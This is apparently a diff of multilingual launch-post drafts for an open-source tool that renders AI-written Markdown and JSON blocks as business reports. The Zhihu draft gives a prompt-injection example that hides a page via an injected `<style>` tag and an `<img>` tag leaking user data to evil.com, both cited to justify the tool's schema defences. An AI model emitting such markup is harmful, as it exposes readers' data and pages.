@@ -23,57 +23,68 @@
 
 ## X / Twitter (English) — 5-post thread
 
+> **Sharpened.** Reveal-by-tweet rhythm (each tweet has its own punch). Tweet 1 = hook, tweet 2 = problem framing, tweet 3 = the move, tweet 4 = receipt (real code), tweet 5 = CTA. **Attach `docs/screenshots/landing-light.png` to tweet 1 and `dashboard-dark.png` to tweet 3** for the image cards.
+
 ```
 1/5
-I made AI agents stop writing HTML for reports.
+I gave Claude 15 report components without letting it write a single line of HTML.
 
-They write a small Markdown contract instead — 15 schema-validated JSON blocks
-covering charts, trend cards, P&L bridges, KPI gauges, sales funnels,
-risk matrices, action items. A 28 KB runtime turns it into a real report.
+It writes Markdown + a few schema-checked JSON blocks. A 28 KB runtime renders them. Result: KPI gauges, P&L bridges, sales funnels, risk matrices — none of which Markdown does — and zero prompt-injection surface.
 
-Demo + repo 👇
+[image: landing-light.png]
 ```
 
 ```
 2/5
-The wedge:
-- HTML reports from AI are unsafe (prompt-injected styles / scripts / iframes)
-- Markdown reports are too flat (no comparison matrix, no funnel, no gauge)
+The debate that triggered this:
 
-AIO is the middle path: AI emits ```aio:funnel@1 { stages: [...] } ```
-The browser runtime renders it. AI never touches HTML/CSS/JS.
+"AI should output HTML"   → can do funnels/charts/layout
+                          → but model-emitted <script>/<style>/<iframe> is unsafe.
+
+"AI should output Markdown" → safe.
+                            → but can't show a 2×2 risk matrix or a P&L bridge.
+
+Both sides have a point. So I built the third path.
 ```
 
 ```
 3/5
-v0.4.x ships:
-• 12 candidate components (trend-card, gauge, waterfall, heatmap, matrix, ...)
-• 30 lazy-loaded syntax-highlight language modules
-• YAML frontmatter → auto report header
-• Locale-aware number formatting (千分位 / currency / percent)
-• CSV export, sticky TOC, print-to-PDF cover pages
+The third path:
+
+AI emits Markdown with fenced JSON blocks. The runtime renders them.
+The model never touches HTML, CSS, JS, iframes, or event handlers.
+
+v0.4.x ships 15 components covering the shapes business reports actually need:
+trend-card, status-grid, timeline, comparison, gauge, funnel, waterfall, heatmap, matrix, action-items.
+
+[image: dashboard-dark.png]
 ```
 
 ```
 4/5
-The contract is small enough to remember:
+A trend-card block is this short:
+
 ```aio:trend-card@1
 {
-  "items": [
-    { "label": "GMV", "value": 12345678, "format": "currency:CNY",
-      "delta": { "value": 0.083, "format": "percent", "direction": "up" },
-      "spark": [9, 10, 11, 12, 12, 13] }
-  ]
+  "items": [{
+    "label": "GMV",
+    "value": 12345678,
+    "format": "currency:CNY",
+    "delta": { "value": 0.083, "direction": "up", "format": "percent" },
+    "spark": [9.1, 9.6, 10.2, 11.1, 10.8, 11.7, 12.3]
+  }]
 }
 ```
-That's it. AI fills the JSON. Humans get a real report.
+
+Renders as ¥12,345,678.00 ▲ 8.3% with a small sparkline. AI fills the JSON. The runtime does the pixels.
 ```
 
 ```
 5/5
-Open source, MIT.
-Try the live demo: https://wxkingstar.github.io/ai-output-runtime/
-Install as Claude Code / Codex / Cursor skill:
+Open source, MIT. Try the live demo (the page is itself an AIO doc):
+https://wxkingstar.github.io/ai-output-runtime/
+
+Install as a Claude Code / Codex / Cursor skill:
 npx skills add wxkingstar/ai-output-runtime -g -y
 
 Repo: https://github.com/wxkingstar/ai-output-runtime
@@ -83,18 +94,24 @@ Repo: https://github.com/wxkingstar/ai-output-runtime
 
 ## X / Twitter (Japanese) — 単発高密度
 
+> **Sharpened.** 冒頭を質問形にしてフックを強化。改行を増やして可読性アップ。
+
 ```
-AI エージェントに HTML を書かせるのは危険、Markdown だけだと貧弱、という両方の問題に対して「データ契約」だけ書かせる第 3 の道を実装しました。
+AI エージェントにレポートを書かせたいけど、HTML はセキュリティ的に怖い、Markdown は表現が貧弱。両方を解決する「第 3 の道」を作りました。
 
-15 個のスキーマ検証付き JSON ブロック（チャート / トレンドカード / ファネル / KPI ゲージ / 損益ウォーターフォール / ヒートマップ / リスク行列 / アクション項目 等）
-30 言語のシンタックスハイライト（lazy-load）
-YAML frontmatter → 自動レポートヘッダ
-Locale-aware 数値フォーマット
-PDF 出力対応の表紙ページ
-28 KB gzipped, MIT
+AI は Markdown + JSON ブロックだけ書く。28KB のランタイムが描画。HTML/CSS/JS は一切書かせません。
 
+v0.4 で揃ったもの：
+✅ 15 コンポーネント（チャート / KPI ゲージ / ファネル / P&L ウォーターフォール / ヒートマップ / 2×2 行列 / タイムライン / アクション項目 …）
+✅ 30 言語のシンタックスハイライト（遅延ロード）
+✅ YAML frontmatter で自動レポートヘッダ
+✅ Locale 対応の数値フォーマット
+✅ 印刷時に表紙ページ + H1 ページブレイク
+
+MIT・OSS：
 https://github.com/wxkingstar/ai-output-runtime
 Demo: https://wxkingstar.github.io/ai-output-runtime/
+Claude Code / Codex / Cursor 用：
 npx skills add wxkingstar/ai-output-runtime -g -y
 ```
 
@@ -102,21 +119,32 @@ npx skills add wxkingstar/ai-output-runtime -g -y
 
 ## X / Weibo / 即刻 — 中文短帖
 
+> **Sharpened.** 第一句改成钩子问题；中部按"问→答→证→招呼"四段切；用 emoji 替换 ✅ list 让结构更紧凑。**配 `docs/screenshots/weekly-dark.png` 或 `dashboard-dark.png`**。
+
 ```
-让 AI 生成业务报告，但不让它写 HTML。
+让 AI 写业务报告，怎么解？
 
-写了一份「数据契约」：AI 只填 15 种 JSON 数据块（漏斗 / 趋势卡 / KPI 仪表 / P&L 桥 / 热力图 / 2×2 风险矩阵 / 行动项 …），28KB 的浏览器 runtime 安全渲染。
+让它写 HTML 不安全（prompt 一注入 <style>整页消失）；
+让它写 Markdown 不够（漏斗、KPI 仪表、P&L 桥 Markdown 表达不出来）。
 
-✅ 周报 / 月报 / 复盘 / Postmortem / KPI-OKR / 财务桥 / 销售漏斗 / 仓储热力 全场景覆盖
-✅ 30 语言代码块高亮，按需懒加载
-✅ Locale 千分位 / 货币 / 百分比自动格式化
-✅ 打印自动出封面 + 分页，可导 PDF
-✅ 每个数据组件可一键导 CSV
+我做了第三条路：AI 只写 Markdown + JSON 数据块，28KB 浏览器 runtime 安全渲染。AI 一行 HTML/CSS/JS 都不写。
 
-Demo: https://wxkingstar.github.io/ai-output-runtime/
-GitHub: https://github.com/wxkingstar/ai-output-runtime
+v0.4 现在能干的事：
+
+📊 15 个组件覆盖周报/月报/复盘/Postmortem/KPI/OKR/销售漏斗/财务 P&L/仓储热力/风险矩阵
+🌈 代码块自动高亮 30 种语言（按需 lazy-load）
+🔢 数字默认千分位 + 货币 + 百分比，自动按语言切换
+🖨️ 打印自动出封面，每个 H1 分页，可导 PDF
+📥 每个数据组件一键导 CSV
+
 装到 Claude Code / Codex / Cursor：
 npx skills add wxkingstar/ai-output-runtime -g -y
+
+Demo（页面本身就是用 AIO 写的）：
+https://wxkingstar.github.io/ai-output-runtime/
+
+GitHub（MIT）：
+https://github.com/wxkingstar/ai-output-runtime
 ```
 
 ---
@@ -253,178 +281,496 @@ schema for each component is in `schemas/*.schema.json`. The CLI is in
 
 ## Reddit r/ClaudeCode — fresh post
 
-**Title**:
-```
-v0.4.3 of a Markdown contract that lets Claude Code write reports without HTML
-```
+> **Sharpened.** Title candidates ranked, body restructured for r/ClaudeCode audience (assume they remember the HTML-vs-Markdown thread), specific code example, three concrete asks.
 
-**Body**:
-```
-Six months ago there was a long thread here about whether Claude should
-output HTML or Markdown for reports. I built a third path and just shipped
-v0.4.3.
+**Title — candidates ranked:**
 
-The deal: Claude writes Markdown with a few fenced JSON blocks. A 28 KB
-browser runtime renders them. Claude literally never writes HTML, CSS, JS,
-or event handlers — the schema rejects `<`, `>`, custom components, scripts,
-all of it.
+1. **(recommended)** `v0.4.3: a Markdown contract that gives Claude 15 report components without HTML` *(89 chars — fits Reddit's 300-char title limit)*
+2. `Six months later: the third path between "AI writes HTML" and "AI writes Markdown"` *(85 chars — narrative-led)*
+3. `I built an agent skill so Claude can ship business reports without writing HTML` *(79 chars — outcome-led)*
 
-What's actually in there (v0.4.3):
+#1 is the most concrete and the title r/ClaudeCode subscribers will scan and stop on. #2 references the old debate (works if it's still in fresh memory). #3 is safest but blandest.
 
-**Components** (15 total)
-- Stable: `table`, `metric-cards`, `callout`
-- Candidate: `chart` (line/bar/area/pie/donut), `trend-card` (value + Δ +
-  sparkline), `status-grid` (good/warn/bad cards), `report-header` (gradient
-  hero, auto-built from markdown YAML frontmatter), `timeline`,
-  `action-items` (with owner/due/priority, auto-overdue), `comparison`
-  (2-6 options × N criteria with recommended column), `gauge` (semicircle
-  KPI/OKR), `funnel` (conversion with auto step + overall %), `waterfall`
-  (P&L bridge / variance), `heatmap` (2D density grid), `matrix` (2×2
-  scatter for risk / RICE / BCG)
-
-**Code highlighting**
-30 languages, 6 inlined (json/bash/js+ts/python/yaml/diff) + 24
-lazy-loaded modules. Code blocks have a header bar with language + Copy
-button. Diff blocks get +/-/@@/file colors.
-
-**Reader UX**
-- Auto Executive Summary card (10-second exec view)
-- Locale-aware number formatting (千分位 / currency / percent)
-- Sticky TOC + active section highlight (≥ 1200px)
-- Print-to-PDF with cover page and forced H1 page breaks
-- CSV export button on every data component
-
-Install via skills CLI:
-  npx skills add wxkingstar/ai-output-runtime -g -y
-
-Demo (itself an AIO document):
-  https://wxkingstar.github.io/ai-output-runtime/
-
-Repo (MIT): https://github.com/wxkingstar/ai-output-runtime
-skills.sh: https://skills.sh/wxkingstar/ai-output-runtime
-
-What I'd love feedback on:
-1. Business-report shapes I missed?
-2. Does the skill description trigger correctly when you say things like
-   "出一份月报" or "做个 OKR 复盘"?
-3. Anyone actually using Claude to ship stakeholder reports? Pain points?
-```
-
----
-
-## 知乎 / 掘金 — 中文长帖（800-1200 字）
-
-**标题**（任选）：
-```
-我让 AI 写 1500 份报告，但不让它写一行 HTML
-让 AI 写 HTML？写 Markdown？我做了第三条路 — AIO v0.4 实战记录
-v0.4 的 AI Output Runtime：15 个组件搞定 80% 业务报告场景
-```
-
-**正文**：
+**Body:**
 
 ```
-半年前，r/ClaudeCode 和 X 上吵过一阵：让 AI 输出 HTML，还是 Markdown？
+A while back there was a long thread here about whether Claude should output
+HTML or Markdown for reports. I built a third path — let Claude emit
+**Markdown with a small set of fenced JSON blocks**, and a 28 KB browser
+runtime renders the blocks. Claude literally never writes HTML, CSS, JS,
+event handlers, or `<style>`/`<script>`/`<iframe>` — the schema rejects
+`<` and `>` in every string field.
 
-HTML 派的理由是：图表、对比矩阵、布局、交互，Markdown 表达不出来。
-Markdown 派的理由是：HTML 不安全，AI 可能写出带 prompt injection 的
-<style>、<script>、<iframe>。
+I just shipped v0.4.3 and figured I owed an update to this sub specifically,
+since that thread is what kicked it off.
 
-两边都对，但没人提出第三种方案：让 AI 只输出**数据**，让一份小小的
-runtime 把数据安全地变成 HTML。
+**What you can ask Claude to make:**
 
-我把这个方案做成了 AI Output Runtime（AIO），刚上 v0.4.3。
+| Ask | Component(s) |
+|-----|--------------|
+| Weekly / monthly / quarterly review | `report-header` + `trend-card` + `status-grid` + `timeline` + `action-items` |
+| Postmortem / incident timeline | `timeline` + `action-items` + `callout` |
+| KPI / OKR scorecard | `gauge` (semicircle, auto-tone from progress vs target) |
+| P&L bridge / variance | `waterfall` (start/up/down/subtotal/end) |
+| Sales / signup funnel | `funnel` (auto step% + overall%) |
+| Inventory / logistics heatmap | `heatmap` (2D, up to 32×32) |
+| Risk matrix / RICE / BCG | `matrix` (2×2 quadrant) |
+| Vendor / option comparison | `comparison` (multi-criteria + recommended column) |
 
-## 核心契约
+15 components total (3 stable + 12 candidates). 30 syntax-highlight languages
+in code blocks (6 inlined, 24 lazy-loaded — 28 KB runtime supports them all).
 
-AI 在 Markdown 里写 fenced code block，info string 用 `aio:name@major`，
-body 是 JSON。例如：
+**A trend-card looks like this in the Markdown Claude emits:**
 
     ```aio:trend-card@1
     {
-      "items": [
-        {
-          "label": "GMV",
-          "value": 12345678,
-          "format": "currency:CNY",
-          "delta": { "value": 0.083, "format": "percent", "direction": "up" },
-          "spark": [9, 10, 11, 12, 12, 13],
-          "tone": "good"
-        }
-      ]
+      "items": [{
+        "label": "GMV",
+        "value": 12345678,
+        "format": "currency:CNY",
+        "delta": { "value": 0.083, "format": "percent", "direction": "up" },
+        "spark": [9.1, 9.6, 10.2, 11.1, 10.8, 11.7, 12.3],
+        "tone": "good"
+      }]
     }
     ```
 
-浏览器加载 28KB 的 runtime（CDN 直引一个 <script>），把这段 JSON 渲染成
-带 sparkline、千分位、向上箭头、绿色 tone 的 metric 卡片。
+The runtime renders a metric card with ¥12,345,678.00, an upward ▲ 8.3% chip,
+and a small SVG sparkline. The model emits data; the runtime renders pixels.
 
-AI 不写任何 HTML/CSS/JS。schema 拒绝 < > 和未注册组件，runtime 把异常
-块降级为可见的 JSON 错误，不爆 XSS。
+**Reader-facing UX**
 
-## v0.4.x 现在有的 15 个组件
+- Executive Summary card auto-built from the first callout + first metric block (10-second exec view).
+- Locale-aware number formatting (千分位, currency, percent — all default; no `format: number` needed).
+- Sticky TOC with active-section highlight on screens ≥ 1200px.
+- Print-to-PDF: report-header becomes a cover page, each H1 forces a page break.
+- CSV export button on every data component.
 
-把 20+ 业务报告场景全部覆盖了一遍：
-
-| 场景 | 组件 |
-|---|---|
-| 周报 / 月报 / 季报 / 业务汇报 | report-header + trend-card + status-grid + timeline + action-items |
-| Postmortem / 复盘 | timeline + action-items + callout |
-| KPI / OKR 达成 | gauge（半圆仪表，自动按达成度上色） |
-| 财务 P&L | waterfall（起始 / +增 / -减 / 小计 / 终值） |
-| 销售转化 | funnel（自动算 step% + overall%） |
-| 运营时段 / 库存周转 | heatmap（小时×星期 / 区域×品类 2D 网格） |
-| 风险评估 / RICE / BCG | matrix（2×2 象限散点） |
-| 方案选型 / 竞品比较 | comparison（多选项 × 多维度，可标推荐项） |
-| 数据汇总 | metric-cards / trend-card / table |
-| 最终判断 | callout（info / success / warning / danger） |
-
-## 30 语言代码高亮，按需懒加载
-
-6 个内置（json / bash / js+ts / python / yaml / diff）+ 24 个 lazy-loaded
-（go / rust / php / ruby / java / kotlin / swift / c / cpp / csharp /
-sql / html / css / xml / dockerfile / toml / ini / lua / perl / r / scala /
-dart / regex / graphql）。runtime 仅 28KB gzipped，首次用到某语言时
-浏览器从 jsDelivr 拉对应的 1-2KB 模块。
-
-## Locale 感知 + 打印封面
-
-数字默认走 `Intl.NumberFormat`（千分位 / ￥ / $ / %），告诉 runtime 你的
-lang 是 `zh-CN` 还是 `en` 它自动选格式。打印时 report-header 变成 A4 封面，
-每个 H1 强制分页，PDF 出片可直接发邮件。
-
-## 装到 Claude Code / Codex / Cursor
-
-skill 已经在 skills.sh 上：
+**Skill install (drops into Claude Code, Codex, Cursor, ~50 others):**
 
 ```bash
 npx skills add wxkingstar/ai-output-runtime -g -y
 ```
 
-之后 Claude Code 看到你说"出一份月报" / "Q1 OKR 复盘" / "做个销售漏斗"，
-会自动激活 skill，按 AIO 契约输出。
+Once installed, Claude routes to it when you say things like *"out a Q1
+review"* / *"复盘上周的事故"* / *"build a sales funnel for last month"* /
+*"评估一下风险"*. The trigger vocabulary covers the common business-report
+verbs in EN/CN/JA.
 
-## 在线 Demo
+**Try it**
 
-整个 demo 页本身就是一份 AIO 文档：
-https://wxkingstar.github.io/ai-output-runtime/
+- Live demo (the page is itself an AIO doc — click *View source* to see the Markdown): https://wxkingstar.github.io/ai-output-runtime/
+- Weekly review demo: https://wxkingstar.github.io/ai-output-runtime/demo-weekly.html
+- Q1 dashboard demo: https://wxkingstar.github.io/ai-output-runtime/demo-dashboard.html
 
-点顶栏的「查看源稿」可以看到生成它的原始 Markdown。两个完整业务 demo：
+**Repo (MIT):** https://github.com/wxkingstar/ai-output-runtime
+
+**Three asks for this sub specifically:**
+
+1. **Which business-report shape doesn't fit any of the 15 components?**
+   waterfall/funnel/matrix cover most of what I needed in production but
+   I know I have blind spots. If you ship reports from Claude and the
+   shape is missing, tell me what data you have.
+
+2. **Does the skill over-fire or under-fire?** The trigger description
+   was just broadened in v0.4.2 — if Claude activates AIO when you wanted
+   prose (or vice versa), that's the most useful data point I can get.
+
+3. **For folks using Claude in production reports:** the biggest pain
+   point you've hit. I keep guessing at this and want real signal.
+
+(Also happy to take pull requests. The whole runtime is one file you can
+read in an hour: `assets/ai-output-runtime.js`.)
+```
+
+---
+
+## 知乎长帖（1500 字左右）
+
+> **Sharpened.** 改成"承诺→证据→可触达"结构。开篇 3 行钩子，正文每段一个具体可点击的链接/可复制的代码块，结尾 4 条"你能带走的东西"。配 2 张截图。
+
+**标题**（任选）：
+1. **（推荐）** `让 AI 写业务报告但不让它写 HTML：v0.4 的「数据契约」实战`
+2. `半年前 r/ClaudeCode 上那场争论，我做了第三条路 — AIO v0.4 复盘`
+3. `15 个组件搞定 80% 业务报告：我让 Claude/Codex 安全产出周月报的方式`
+
+**配图建议**：
+- 头图：`docs/screenshots/weekly-dark.png`（周报全貌）
+- 中段：`docs/screenshots/dashboard-dark.png`（Q1 dashboard，含 gauge/funnel/waterfall/heatmap/matrix）
+
+**正文**：
+
+```markdown
+半年前 r/ClaudeCode 上吵过一阵：让 AI 写业务报告，应该输出 **HTML 还是
+Markdown**？
+
+HTML 派说：图表、对比矩阵、布局、KPI 仪表，Markdown 表达不出来。
+Markdown 派说：HTML 不安全，模型可能写出带 prompt injection 的
+`<style>`、`<script>`、`<iframe>`。
+
+两边都对。但都没说出第三条路：**让 AI 只输出"数据"，让一份小小的
+runtime 把数据安全地变成 HTML**。
+
+我把这条路做出来了——AI Output Runtime（AIO），最新 v0.4.3。这篇说说
+它能干什么、为什么这么设计、以及怎么用。读完你可以带走的东西：
+
+1. 一个能直接拿去用的 28 KB 浏览器 runtime（CDN 直引）。
+2. 一份 15 个组件的"业务报告组件库"，能让 Claude/Codex 给你出周报、
+   月报、复盘、KPI、P&L、销售漏斗、风险矩阵这些。
+3. 一种思路：把"AI 能干什么"和"AI 不能干什么"分得很开，写在 schema 里。
+4. 一个直接装到 Claude Code / Codex / Cursor 的 agent skill。
+
+---
+
+## 一个最小例子
+
+AI 在 Markdown 里写这样一段（注意 info string 是 `aio:name@major`，
+body 是合法 JSON）：
+
+    ```aio:trend-card@1
+    {
+      "items": [{
+        "label": "GMV",
+        "value": 12345678,
+        "format": "currency:CNY",
+        "delta": { "value": 0.083, "format": "percent", "direction": "up" },
+        "spark": [9.1, 9.6, 10.2, 11.1, 10.8, 11.7, 12.3],
+        "tone": "good"
+      }]
+    }
+    ```
+
+浏览器载入 runtime（一个 `<script>` 标签）后，这段 JSON 被渲染成：
+
+> **GMV**
+> **¥12,345,678.00**　▲ 8.3% (vs 上周)
+> 📈 内嵌一条小 sparkline
+
+AI 没写任何 HTML/CSS/JS，runtime 负责所有的视觉。
+
+## 为什么不让 AI 直接写 HTML
+
+直接生成的两个真实风险：
+
+- **prompt injection**：用户输入里藏一句 `<style>body{display:none}</style>`，
+  AI 一并贴进 report 里，整页消失。
+- **第三方 fetch**：AI 引一个 `<img src="https://evil.com/x.png?...">`，
+  把用户数据通过 referer/url 偷出去。
+
+AIO 的做法是在 schema 层把这些路径全堵死：
+
+- 任何 string 字段不允许 `<` 或 `>`（runtime + CLI 双重校验）。
+- block 必须是合法 JSON（注释、trailing comma 都拒）。
+- 组件名必须是 registry 里登记过的（`aio:xxx@1` 没被注册的整块降级为
+  可见的 JSON 错误，不爆 XSS）。
+- runtime 自己没有 `fetch` 调用；唯一的网络请求是按需加载代码块语法
+  高亮的 lang 模块（URL 白名单：`https://cdn.jsdelivr.net/gh/wxkingstar/...`）。
+
+## v0.4.x 的 15 个组件，对应业务场景
+
+| 你要做的报告 | 用哪些组件 |
+|---|---|
+| 周报 / 月报 / 季报 / 业务汇报 | `report-header` + `trend-card` + `status-grid` + `timeline` + `action-items` |
+| Postmortem / 事故复盘 | `timeline` + `action-items` + `callout` |
+| KPI / OKR 达成度看板 | `gauge`（半圆仪表，按达成度自动着色） |
+| 财务 P&L 桥 / 经营变动归因 | `waterfall`（start / up / down / subtotal / end） |
+| 销售转化漏斗 / 注册激活分析 | `funnel`（自动算环比 + 累计转化率） |
+| 运营时段 / 仓储热力 / 区域品类 | `heatmap`（最大 32×32 的二维网格） |
+| 风险评估 / RICE / BCG 优先级 | `matrix`（2×2 象限散点） |
+| 方案选型 / 竞品比较 / Vendor 评分 | `comparison`（多选项 × 多维度，可标推荐列） |
+| 静态数据 / 多服务状态 | `metric-cards` / `status-grid` / `table` |
+| 结论 / 风险预警 / 推荐 | `callout`（info / success / warning / danger） |
+
+每个组件都有自己的 schema，CLI 在校验时同时检查跨字段不变量
+（比如 funnel 的 stage value 必须单调非增，matrix 的 item 坐标
+必须在 `[xMin, xMax] × [yMin, yMax]` 内，waterfall 第一根柱必须是
+`kind: "start"`）。
+
+## 代码块同时也能高亮，30 种语言
+
+不只是数据组件——AI 写代码块也能拿到漂亮高亮。**6 个内置**（json /
+bash / js+ts / python / yaml / diff），24 个 **lazy-load**（go / rust /
+php / ruby / java / kotlin / swift / c / cpp / csharp / sql / html / css /
+xml / dockerfile / toml / ini / lua / perl / r / scala / dart / regex /
+graphql）。
+
+runtime 主文件只有 28 KB gzipped。第一次有人在你的报告里用 `rust`
+语言，浏览器从 jsDelivr 拉 `lang/rust.js`（约 1.1 KB）再 in-place
+重新渲染那块代码。
+
+## Reader-facing 体验，不是"裸 markdown 凑活"
+
+v0.4.x 加的几个对人最有感的东西：
+
+- **自动 Executive Summary 卡**：扫文档自动抽取首个 callout + 首个
+  trend-card，生成一张 10 秒看懂的折叠摘要卡，挂在 report-header 后面。
+- **数字千分位 + locale 货币**：默认走 `Intl.NumberFormat`，根据文档
+  `lang` 自动选格式。`12345678` 在 zh-CN 渲染为 `12,345,678`，在
+  `currency:CNY` 下变成 `¥12,345,678.00`，在 `currency:JPY` 下变成
+  `￥12,345,678`。
+- **Sticky TOC + 当前章节高亮**：≥1200px 的屏右栏粘住，IntersectionObserver
+  标红当前章节。
+- **章节锚点**：hover h1/h2/h3 出 `#` 图标，点击复制章节链接到剪贴板。
+- **打印封面 + H1 分页**：`@page` A4，report-header 自动变封面页，
+  每个 H1 强制分页。`Cmd+P` → "Save as PDF" 就是一份可发邮件的报告。
+- **CSV 一键导出**：table/chart/heatmap/funnel/waterfall/trend-card/
+  comparison/gauge 头部条都有 `⤓ CSV` 按钮，分析师朋友能直接拿原始数据。
+
+## 装到 Claude Code / Codex / Cursor
+
+```bash
+npx skills add wxkingstar/ai-output-runtime -g -y
+```
+
+之后 Claude Code 看到你说**"出一份月报"** / **"Q1 OKR 复盘"** /
+**"做个销售漏斗"** / **"评估一下风险"** 会自动激活这个 skill，按 AIO
+契约输出。skill 的描述里中英双语触发词覆盖了 50+ 个业务报告场景。
+
+## 在线 demo（**这个 demo 页本身就是一份 AIO 文档**）
+
+主页：https://wxkingstar.github.io/ai-output-runtime/
+（点顶栏的"查看源稿"能看到生成它的原始 Markdown，非常直观）
+
+两个完整业务 demo：
+
 - 周报：https://wxkingstar.github.io/ai-output-runtime/demo-weekly.html
 - Q1 Dashboard：https://wxkingstar.github.io/ai-output-runtime/demo-dashboard.html
 
-## 不做什么
+## 这个项目刻意不做的事
 
-- 不重新发明可视化 — 就 line/bar/area/pie/donut + 5 个商业图表，复杂的
-  让 ECharts 上。
-- 不渲染富文本 — 字段只接 plain text + 受限 Markdown 内联，禁 HTML。
-- 不联网 — runtime 没有 fetch；唯一例外是 lang/*.js 按需加载，URL 白名单。
+- **不重新发明可视化**：就 line/bar/area/pie/donut + 5 个商业图表。
+  复杂的让 ECharts/D3 上，AIO 留在"5 分钟产出一份能看的报告"这条线。
+- **不渲染富文本 HTML**：字段只接 plain text + 一小段受限 Markdown 内联
+  （加粗/斜体/inline code/链接），HTML 标签一律拒。
+- **不留任何 prompt injection 通道**：style、script、event handler、
+  template expression、custom component 全部 schema 禁。
 
-## 仓库
+## 我踩过的坑（你可以避开）
+
+1. **第一版数字默认 raw 输出**——`12800000` 看着像编号不像金额。v0.4.3
+   改成默认千分位后，被人评论"这才像报告"。
+2. **第一版漏斗的 value 写在 bar 里面**——bar 一旦 < 1% 数字就被吃掉。
+   改成永远显示在 bar 右侧外。教训：数据可视化里"小柱体"是边界 case。
+3. **第一版 SKILL.md 的 description 只列了 4 个组件**——加完 11 个新
+   组件后路由器还在按老描述触发，AI 不会主动用新组件。v0.4.2 把
+   description 扩到 50+ 触发词才修正。
+
+## 仓库 & 反馈
 
 GitHub（MIT）：https://github.com/wxkingstar/ai-output-runtime
 skills.sh listing：https://skills.sh/wxkingstar/ai-output-runtime
 
-欢迎提 issue 说还有哪些业务报告场景没覆盖到。
+最想听的反馈：
+
+- 你的业务报告里有哪种形态，AIO 这 15 个组件没覆盖到？
+- 把这个 skill 装到 Claude 后，让它出报告时哪里"违反直觉"？
+- 用 Claude 做 stakeholder 报告你最大的痛点是什么？
+
+issues 区见。
+```
+
+---
+
+## 掘金（中文技术长文）
+
+> 比知乎更技术，更多代码块和 API 例子；少一点叙事，多一点"动手做"。
+
+**标题**：
+```
+v0.4：让 AI 写业务报告但不让它写 HTML — AI Output Runtime 实战
+```
+
+**正文与知乎版差异**：
+- 开篇直接进契约示例（少叙事）。
+- 多加 1-2 个完整组件示例（funnel + waterfall）。
+- 多一段"代码块同时也能高亮 30 种语言"具体演示。
+- 末尾加"想 fork 二次开发？runtime 是单文件，逐段读"的 onboarding。
+
+正文模板（在知乎版基础上微调）：
+
+```markdown
+（先 1 段 hook 段——同知乎开头，但缩到 50 字以内）
+
+## 一个 funnel 例子
+
+    ```aio:funnel@1
+    {
+      "title": "Q1 销售漏斗",
+      "stages": [
+        { "label": "曝光", "value": 12800000 },
+        { "label": "点击", "value": 1840000 },
+        { "label": "加购", "value": 320000 },
+        { "label": "下单", "value": 4500 },
+        { "label": "支付完成", "value": 60 }
+      ]
+    }
+    ```
+
+CLI 校验通过后（`node scripts/aio.mjs validate file.md`），浏览器 runtime
+渲染成 5 条水平条 + 自动算每段环比和累计转化率：
+环比 14.4% / 17.4% / 1.4% / 1.3%，累计 100% / 14.4% / 2.5% / 0.04% / 0.0005%。
+
+## 一个 waterfall（P&L 桥）例子
+
+    ```aio:waterfall@1
+    {
+      "title": "Q1 P&L Bridge",
+      "format": "currency:CNY",
+      "bars": [
+        { "label": "Revenue", "value": 420000000, "kind": "start" },
+        { "label": "COGS",    "value": -260000000, "kind": "down" },
+        { "label": "Gross",   "value":  160000000, "kind": "subtotal" },
+        { "label": "OpEx",    "value":  -88000000, "kind": "down" },
+        { "label": "Net",     "value":   72000000, "kind": "end" }
+      ]
+    }
+    ```
+
+5 根柱：start 蓝、down 红、subtotal 蓝、down 红、end 蓝，柱间虚线连
+表示累计。schema 强制：第一根必须是 `start`，up/down 在前一根的
+cumulative 上叠加，subtotal/end 重置到 0 基线。
+
+（剩下复用知乎版"15 个组件 / 30 语言 / Reader UX / 装 skill / demo /
+踩过的坑 / 仓库"几段，技术语气调严一点。）
+```
+
+---
+
+## Qiita（日本語長文）
+
+**タイトル**:
+```
+AI に HTML を書かせずにレポートを書かせる：AI Output Runtime v0.4 実装メモ
+```
+
+**本文**:
+
+```markdown
+半年前、r/ClaudeCode と X で長い議論がありました：「AI にレポートを書かせるなら、
+HTML を出力させるべきか、Markdown だけにすべきか」。
+
+両方とも一理あります：
+
+- **HTML 派**：チャート、KPI ゲージ、ファネル、2×2 リスク行列 — Markdown では
+  表現できない。
+- **Markdown 派**：HTML は危険。プロンプト注入で `<style>`、`<script>`、
+  `<iframe>` が混入したら終わり。
+
+僕は第 3 の道を実装しました：**AI には「データ」だけ書かせて、小さなランタイムが
+それを安全に HTML に変換する**。
+
+このプロジェクトを AI Output Runtime（AIO）と呼んでいます。最新版は v0.4.3 です。
+
+## 契約の最小例
+
+AI が Markdown 内に書く fenced code block：
+
+    ```aio:trend-card@1
+    {
+      "items": [{
+        "label": "GMV",
+        "value": 12345678,
+        "format": "currency:JPY",
+        "delta": { "value": 0.083, "format": "percent", "direction": "up" },
+        "spark": [9.1, 9.6, 10.2, 11.1, 10.8, 11.7, 12.3],
+        "tone": "good"
+      }]
+    }
+    ```
+
+ブラウザは 28 KB のランタイム（CDN から `<script>` 一行）を読み込み、この JSON を：
+
+> **GMV**　￥12,345,678　▲ 8.3%（前週比）
+> 📈 sparkline 付き
+
+として描画します。AI は HTML/CSS/JS を一切書きません。
+
+## v0.4 の 15 コンポーネント、業務レポート全カバー
+
+| 何のレポート | どのコンポーネント |
+|---|---|
+| 週報 / 月報 / 四半期レビュー | `report-header` + `trend-card` + `status-grid` + `timeline` + `action-items` |
+| ポストモーテム / インシデント振り返り | `timeline` + `action-items` + `callout` |
+| KPI / OKR 達成率ダッシュボード | `gauge`（半円メーター、進捗で自動着色） |
+| 損益計算書（P&L）ブリッジ | `waterfall`（start / up / down / subtotal / end） |
+| 売上ファネル / 登録活性化分析 | `funnel`（自動でステップ % + 累計 %） |
+| 時間帯ヒートマップ / 在庫回転 | `heatmap`（最大 32×32 グリッド） |
+| リスク評価 / RICE / BCG 優先順位 | `matrix`（2×2 散布図） |
+| 案件選定 / 競合比較 | `comparison`（複数選択肢 × 複数評価軸） |
+| 最終判断 / 推奨 / 警告 | `callout` |
+
+各コンポーネントには独立した JSON Schema があり、CLI 側で
+クロスフィールド不変条件（funnel の単調非増加、matrix 座標境界、
+waterfall の `start` 必須など）を強制します。
+
+## セキュリティ境界
+
+- すべての string フィールドは `<` と `>` を拒否（ランタイム + CLI 二重チェック）
+- block は valid JSON 必須（コメント、trailing comma 拒否）
+- 未登録のコンポーネント名は可視 JSON エラーにフォールバック（XSS にならない）
+- ランタイム本体に `fetch` 呼び出しなし。唯一のネットワーク要求はコードハイライト
+  用の lang/*.js 遅延ロード（URL ホワイトリスト：`https://cdn.jsdelivr.net/gh/...`）
+
